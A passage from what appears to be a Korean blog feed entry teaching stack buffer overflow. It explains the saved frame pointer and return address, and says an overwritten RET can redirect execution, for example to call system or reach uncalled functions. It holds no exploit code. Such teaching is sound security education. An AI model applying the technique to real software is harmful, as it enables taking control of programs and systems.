&lt;p&gt;이제 여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Save Frame Pointer&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;Return&lt;/code&gt;을 알아야 합니다.&lt;/p&gt;

&lt;p&gt;Save Frame Pointer는 &lt;code class=&quot;highlighter-rouge&quot;&gt;이전함수에서의 ebp 값을 저장&lt;/code&gt;해 둡니다. 해당 함수가 실행되고 난 후에 다시 돌아가야 할 때 이 값을 기준으로 돌아가게 됩니다.&lt;/p&gt;

&lt;p&gt;Return은 해당 주소로 이동하는 것입니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/system_hacking/bof/stack.png&quot; alt=&quot;stack&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Stack의 구조는 위와 같이 이루어져 있기 때문에 앞서 값을 넘치게 입력했을 경우 0x36353433로 이동하게 된 것입니다.&lt;/p&gt;

&lt;p&gt;이러한 방법으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;RET 값을 조작해서 system 함수를 호출하거나 프로그램 상에서 호출되지 않는 함수에도 접근이 가능&lt;/code&gt;하게 됩니다.&lt;/p&gt;</content><author><name></name></author><summary type="html">개념</summary></entry></feed>